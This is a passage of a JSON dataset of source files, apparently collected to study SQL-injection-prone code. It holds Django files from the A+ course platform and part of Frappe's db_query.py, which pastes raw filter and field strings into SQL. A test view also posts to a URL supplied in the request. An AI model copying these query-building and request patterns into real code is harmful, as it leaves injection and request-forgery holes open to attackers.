        "source": "from django import template\nfrom django.utils import timezone\n\nfrom lib.errors import TagUsageError\nfrom ..cache import CachedNews\nfrom ..models import News\n\n\nregister = template.Library()\n\n\n@register.inclusion_tag(\"news/user_news.html\", takes_context=True)\ndef user_news(context, num, more=0):\n    if not 'instance' in context:\n        raise TagUsageError()\n    if not 'now' in context:\n        context['now'] = timezone.now()\n    if not 'course_news' in context:\n        context['course_news'] = CachedNews(context['instance'])\n    news = context['course_news']\n\n    if context['is_course_staff']:\n        alerts,news = news.for_staff()\n    else:\n        user = context['request'].user\n        alerts,news = news.for_user(\n            not user.is_authenticated()\n            or user.userprofile.is_external\n        )\n\n    i = 0\n    for item in news:\n        i += 1\n        item['collapsed'] = i > num\n        if more > 0 and i == more:\n            item['begin_more'] = True\n\n    return {\n        'is_course_staff': context['is_course_staff'],\n        'now': context['now'],\n        'alerts': alerts,\n        'news': news,\n        'more': more,\n    }\n\n\n@register.filter\ndef is_published(entry, now):\n    return entry['publish'] <= now\n\n\n@register.filter\ndef news_audience(audience):\n    return News.AUDIENCE[audience]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/notification/cache.py",
        "source": "from django.db.models.signals import post_save, post_delete\n\nfrom lib.cache import CachedAbstract\nfrom .models import Notification\n\n\nclass CachedNotifications(CachedAbstract):\n    KEY_PREFIX = \"notifications\"\n\n    def __init__(self, user):\n        super().__init__(user)\n\n    def _generate_data(self, user, data=None):\n        if not user or not user.is_authenticated():\n            return {\n                'count': 0,\n                'notifications': [],\n            }\n\n        def notification_entry(n):\n            exercise = n.submission.exercise if n.submission else None\n            return {\n                'id': n.id,\n                'submission_id': n.submission.id if n.submission else 0,\n                'name': \"{} {}, {}\".format(\n                    n.course_instance.course.code,\n                    (str(exercise.parent)\n                        if exercise and exercise.parent else\n                     n.course_instance.instance_name),\n                    (str(exercise)\n                        if exercise else\n                     n.subject),\n                ),\n                'link': n.get_display_url(),\n            }\n\n        notifications = list(\n            user.userprofile.received_notifications\\\n                .filter(seen=False)\\\n                .select_related(\n                    'submission',\n                    'submission__exercise',\n                    'course_instance',\n                    'course_instance__course',\n                )\n        )\n        return {\n            'count': len(notifications),\n            'notifications': [notification_entry(n) for n in notifications],\n        }\n\n    def count(self):\n        return self.data['count']\n\n    def notifications(self):\n        return self.data['notifications']\n\n\ndef invalidate_notifications(sender, instance, **kwargs):\n    CachedNotifications.invalidate(instance.recipient.user)\n\n\n# Automatically invalidate cache when notifications change.\npost_save.connect(invalidate_notifications, sender=Notification)\npost_delete.connect(invalidate_notifications, sender=Notification)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/notification/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0001_initial'),\n        ('course', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Notification',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('subject', models.CharField(max_length=255)),\n                ('notification', models.TextField()),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('seen', models.BooleanField(default=False)),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance')),\n                ('recipient', models.ForeignKey(related_name='received_notifications', to='userprofile.UserProfile')),\n                ('sender', models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile')),\n            ],\n            options={\n                'ordering': ['-timestamp'],\n            },\n            bases=(models.Model,),\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/notification/migrations/0002_auto_20160912_1341.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0022_auto_20160906_1401'),\n        ('notification', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='notification',\n            name='submission',\n            field=models.ForeignKey(to='exercise.Submission', blank=True, null=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='notification',\n            name='notification',\n            field=models.TextField(blank=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='notification',\n            name='sender',\n            field=models.ForeignKey(related_name='sent_notifications', to='userprofile.UserProfile', blank=True, null=True),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='notification',\n            name='subject',\n            field=models.CharField(blank=True, max_length=255),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/notification/migrations/0003_auto_20160914_1051.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('notification', '0002_auto_20160912_1341'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='notification',\n            name='submission',\n            field=models.ForeignKey(blank=True, related_name='notifications', null=True, to='exercise.Submission'),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/selenium_test/grader/exercises/views.py",
        "source": "from django.http import HttpResponse\nfrom django.shortcuts import render\nfrom django.core.urlresolvers import reverse\n\n\ndef first(request):\n\n    if request.method == \"POST\":\n        submission = request.POST.get(\"answer\", \"\").lower()\n        points = 0\n        if 'hello' in submission:\n            points += 1\n        if 'a+' in submission:\n            points += 1\n        return render(request, \"exercises/first_result.html\", {\n            \"points\": points,\n            \"max_points\": 2,\n        })\n\n    return render(request, \"exercises/first_exercise.html\")\n\n\ndef file(request):\n\n    if request.method == \"POST\":\n        if \"myfile\" in request.FILES and request.FILES[\"myfile\"].name:\n            status = \"accepted\"\n        else:\n            status = \"error\"\n        return render(request, \"exercises/file_result.html\", {\n            \"status\": status,\n        })\n\n    return render(request, \"exercises/file_exercise.html\")\n\n\ndef ajax(request):\n\n    def parse_int(s):\n        try:\n            return int(s)\n        except Exception:\n            return 0\n\n    if request.method == \"POST\":\n        points = parse_int(request.POST.get(\"points\"))\n        max_points = parse_int(request.POST.get(\"max_points\"))\n        url = request.GET.get(\"submission_url\")\n\n        def respond_text(text):\n            response = HttpResponse(text)\n            response[\"Access-Control-Allow-Origin\"] = \"*\"\n            return response\n\n        if not url:\n            return respond_text('{ \"errors\": [\"Missing submission_url\"] }')\n\n        import requests\n        response = requests.post(url, timeout=3, data={\n            \"points\": points,\n            \"max_points\": max_points,\n            \"feedback\": \"You got {} / {} points for your answer.\".format(points, max_points),\n            \"grading_payload\": \"{}\",\n        })\n        return respond_text(response.text)\n\n    return render(request, \"exercises/ajax_exercise.html\", {\n        \"url\": request.build_absolute_uri(\"{}?{}\".format(\n            reverse(\"ajax\"), request.META.get(\"QUERY_STRING\", \"\")\n        )),\n    })\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/shibboleth_login/tests.py",
        "source": "import urllib.parse\n\nfrom django.conf import settings\nfrom django.contrib.auth.models import User\nfrom django.core.urlresolvers import reverse\nfrom django.test import TestCase, modify_settings\nfrom django.utils import timezone\n\n\nDEF_SHIBD_META = {\n    'SHIB_cn': 'Teemu Teekkari',\n    'SHIB_mail': 'teemu.teekkari@aalto.fi',\n    'Shib-Authentication-Method': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',\n    'Shib-Identity-Provider': 'https://locahost/idp/shibboleth',\n    'SHIB_displayName': 'Teemudemus',\n    'Shib-AuthnContext-Class': 'urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport',\n    'SHIB_schacPersonalUniqueCode': 'urn:mace:terena.org:schac:personalUniqueCode:int:studentID:aalto.fi:123453',\n    'Shib-Session-Index': '_941d95bafed0b1787c81541e627a8c8b',\n    'SHIB_sn': 'Teekkari',\n    'SHIB_givenName': 'Teemu',\n    'Shib-Application-ID': 'default',\n    'Shib-Authentication-Instant': str(timezone.now()),\n    'Shib-Session-ID': '_92d7c6a832b5c7dafea59ea12ca1289e',\n    'SHIB_preferredLanguage': 'fi',\n    'SHIB_logouturl': 'https://localhost/idp/aalto_logout.jsp',\n    'SHIB_eppn': 'teekkarit@aalto.fi',\n}\n\n@modify_settings(\n    INSTALLED_APPS={'append': 'shibboleth_login'},\n    AUTHENTICATION_BACKENDS={'append': 'shibboleth_login.auth_backend.ShibbolethAuthBackend'},\n)\nclass ShibbolethTest(TestCase):\n\n    def setUp(self):\n        self.user = User(\n            username='meikalm8@aalto.fi',\n            email='',\n            first_name='Matti',\n            last_name='Sukunimi',\n        )\n        self.user.set_unusable_password()\n        self.user.save()\n        self.user.userprofile.student_id = '000'\n        self.user.userprofile.save()\n\n        self.login_url = reverse('shibboleth-login')\n\n    def test_invalid(self):\n        meta = DEF_SHIBD_META.copy()\n        del meta['SHIB_eppn']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 403)\n        self.assertEqual(User.objects.count(), 1)\n\n    def test_valid_new(self):\n        meta = DEF_SHIBD_META.copy()\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 2)\n        user = User.objects.get(username='teekkarit@aalto.fi')\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Teemu')\n        self.assertEqual(user.last_name, 'Teekkari')\n        self.assertEqual(user.userprofile.student_id, '123453')\n\n    def test_without_email(self):\n        meta = DEF_SHIBD_META.copy()\n        del meta['SHIB_mail']\n        del meta['SHIB_givenName']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 2)\n        user = User.objects.get(username='teekkarit@aalto.fi')\n        self.assertEqual(user.email, '{:d}@localhost'.format(user.id))\n        self.assertEqual(user.first_name, '')\n        self.assertEqual(user.last_name, 'Teekkari')\n        self.assertEqual(user.userprofile.student_id, '123453')\n\n    def test_without_student_id(self):\n        meta = DEF_SHIBD_META.copy()\n        del meta['SHIB_schacPersonalUniqueCode']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 2)\n        user = User.objects.get(username='teekkarit@aalto.fi')\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Teemu')\n        self.assertEqual(user.last_name, 'Teekkari')\n        self.assertEqual(user.userprofile.student_id, None)\n\n    def test_valid_old(self):\n        meta = DEF_SHIBD_META.copy()\n        meta['SHIB_eppn'] = self.user.username\n        del meta['SHIB_sn']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 1)\n        user = User.objects.first()\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Teemu')\n        self.assertEqual(user.last_name, 'Sukunimi')\n        self.assertEqual(user.userprofile.student_id, '123453')\n\n    def test_nonascii(self):\n        meta = DEF_SHIBD_META.copy()\n        meta['SHIB_eppn'] = self.user.username.encode('utf-8')\n        del meta['SHIB_givenName']\n        meta['SHIB_sn'] = 'Meiklinen'\n        del meta['SHIB_schacPersonalUniqueCode']\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 302)\n        self.assertEqual(User.objects.count(), 1)\n        user = User.objects.first()\n        self.assertEqual(user.email, 'teemu.teekkari@aalto.fi')\n        self.assertEqual(user.first_name, 'Matti')\n        self.assertEqual(user.last_name, 'Meiklinen')\n        self.assertEqual(user.userprofile.student_id, '000')\n\n    def test_inactive(self):\n        self.user.is_active = False\n        self.user.save()\n        meta = DEF_SHIBD_META.copy()\n        meta['SHIB_eppn'] = self.user.username.encode('utf-8')\n        response = self._get(meta)\n        self.assertEqual(response.status_code, 403)\n        self.assertEqual(User.objects.count(), 1)\n\n    def _get(self, meta):\n        if settings.SHIBBOLETH_VARIABLES_URL_ENCODED:\n            for key in meta.keys():\n                meta[key] = urllib.parse.quote(meta[key])\n        return self.client.generic('GET', self.login_url, **meta)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/threshold/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0032_auto_20170215_0953'),\n        ('exercise', '0025_auto_20170215_0953'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseModuleRequirement',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('negative', models.BooleanField(default=False)),\n                ('module', models.ForeignKey(to='course.CourseModule', related_name='requirements')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='Threshold',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('name', models.CharField(max_length=255)),\n                ('consume_harder_points', models.BooleanField(help_text='Harder points are consumed by easier difficulty requirements.', default=False)),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance', related_name='thresholds')),\n                ('passed_categories', models.ManyToManyField(blank=True, to='course.LearningObjectCategory')),\n                ('passed_exercises', models.ManyToManyField(blank=True, to='exercise.BaseExercise')),\n                ('passed_modules', models.ManyToManyField(blank=True, to='course.CourseModule')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='ThresholdPoints',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('limit', models.PositiveIntegerField()),\n                ('difficulty', models.CharField(blank=True, max_length=32)),\n                ('order', models.PositiveIntegerField(default=1)),\n                ('threshold', models.ForeignKey(to='threshold.Threshold', related_name='points')),\n            ],\n            options={\n                'ordering': ['threshold', 'order'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='coursemodulerequirement',\n            name='threshold',\n            field=models.ForeignKey(to='threshold.Threshold'),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/userprofile/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\nfrom django.conf import settings\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        migrations.swappable_dependency(settings.AUTH_USER_MODEL),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='StudentGroup',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(unique=True, max_length=32)),\n                ('description', models.CharField(max_length=256)),\n                ('member_limit', models.PositiveIntegerField()),\n                ('is_public', models.BooleanField(default=False)),\n                ('invitation_key', models.CharField(max_length=10, blank=True)),\n            ],\n            options={\n                'ordering': ['name'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='UserProfile',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('lang', models.CharField(default=b'en_US', max_length=5)),\n                ('student_id', models.CharField(max_length=25, null=True, blank=True)),\n                ('user', models.OneToOneField(to=settings.AUTH_USER_MODEL)),\n            ],\n            options={\n                'ordering': ['id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='studentgroup',\n            name='members',\n            field=models.ManyToManyField(related_name='groups', to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/userprofile/viewbase.py",
        "source": "from django.core.exceptions import PermissionDenied\nfrom django.template.response import SimpleTemplateResponse\n\nfrom lib.viewbase import BaseMixin, BaseTemplateView\nfrom authorization.permissions import ACCESS\nfrom .models import UserProfile\n\n\nclass UserProfileMixin(BaseMixin):\n    access_mode = ACCESS.STUDENT\n    login_redirect = True\n\n    def get_resource_objects(self):\n        super().get_resource_objects()\n        user = self.request.user\n        if user.is_authenticated():\n            self.profile = profile = user.userprofile\n            self.is_external_student = profile.is_external\n        else:\n            self.profile = None\n            self.is_external_student = False\n\n        # Add available for template\n        self.note(\"profile\", \"is_external_student\")\n\n\nclass UserProfileView(UserProfileMixin, BaseTemplateView):\n    pass\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/userprofile/views.py",
        "source": "import logging\nfrom django.conf import settings\nfrom django.contrib.auth import REDIRECT_FIELD_NAME\nfrom django.contrib.auth.views import login as django_login\nfrom django.core.cache import cache\nfrom django.core.cache.utils import make_template_fragment_key\nfrom django.http.response import HttpResponseRedirect\nfrom django.shortcuts import resolve_url\nfrom django.template.loader import TemplateDoesNotExist, get_template\nfrom django.utils.http import is_safe_url\nfrom django.utils.translation import get_language\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom lib.helpers import settings_text\nfrom authorization.permissions import ACCESS\nfrom .viewbase import UserProfileView\n\n\nlogger = logging.getLogger('userprofile.views')\n\n\ndef login(request):\n    \"\"\"\n    Wraps the default login view in Django. Additionally redirects already\n    authenticated users automatically to the target.\n    \"\"\"\n    if request.user.is_authenticated():\n        redirect_to = request.POST.get(REDIRECT_FIELD_NAME,\n                                       request.GET.get(REDIRECT_FIELD_NAME, ''))\n        if not is_safe_url(url=redirect_to, host=request.get_host()):\n            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)\n        return HttpResponseRedirect(redirect_to)\n\n    return django_login(\n        request,\n        template_name=\"userprofile/login.html\",\n        extra_context={\n            'shibboleth_login': 'shibboleth_login' in settings.INSTALLED_APPS,\n            'mooc_login': 'social_django' in settings.INSTALLED_APPS,\n            'login_title_text': settings_text('LOGIN_TITLE_TEXT'),\n            'login_body_text': settings_text('LOGIN_BODY_TEXT'),\n            'login_button_text': settings_text('LOGIN_BUTTON_TEXT'),\n            'shibboleth_title_text': settings_text('SHIBBOLETH_TITLE_TEXT'),\n            'shibboleth_body_text': settings_text('SHIBBOLETH_BODY_TEXT'),\n            'shibboleth_button_text': settings_text('SHIBBOLETH_BUTTON_TEXT'),\n            'mooc_title_text': settings_text('MOOC_TITLE_TEXT'),\n            'mooc_body_text': settings_text('MOOC_BODY_TEXT'),\n        }\n    )\n\n\ndef try_get_template(name):\n    try:\n        return get_template(name)\n    except TemplateDoesNotExist:\n        logger.info(\"Template %s not found\", name)\n        return None\n\n\nclass PrivacyNoticeView(UserProfileView):\n    access_mode=ACCESS.ANONYMOUS\n    template_name=\"userprofile/privacy.html\"\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        lang = \"_\" + get_language().lower()\n        key = make_template_fragment_key('privacy_notice', [lang])\n        privacy_text = cache.get(key)\n        if not privacy_text:\n            template_name = \"privacy_notice{}.html\"\n            template = try_get_template(template_name.format(lang))\n            if not template and len(lang) > 3:\n                template = try_get_template(template_name.format(lang[:3]))\n            if not template:\n                logger.warning(\"No localized privacy notice for language %s\", lang)\n                template = try_get_template(template_name.format(''))\n            if not template:\n                logger.error(\"No privacy notice at all!\")\n\n            privacy_text = template.render() if template else _(\"No privacy notice. Please notify administration!\")\n            cache.set(key, privacy_text)\n        self.privacy_text = privacy_text\n        self.note(\"privacy_text\")\n\nclass ProfileView(UserProfileView):\n    template_name = \"userprofile/profile.html\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jforv/frappe/blob/d1e573dba8c1a4dc3f086686a5fee0befe113e8a",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.list_settings import get_list_settings, update_list_settings\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,\n\t\tupdate=None, add_total_row=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\traise frappe.PermissionError, self.doctype\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], basestring):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.list_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_list_settings:\n\t\t\tself.save_list_settings_fields = save_list_settings_fields\n\t\t\tself.update_list_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t ' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\t\tself.check_sort_by_table(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, basestring):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, basestring):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in fdict.iteritems():\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f): continue\n\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\traise frappe.PermissionError, doctype\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, basestring):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, basestring):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator 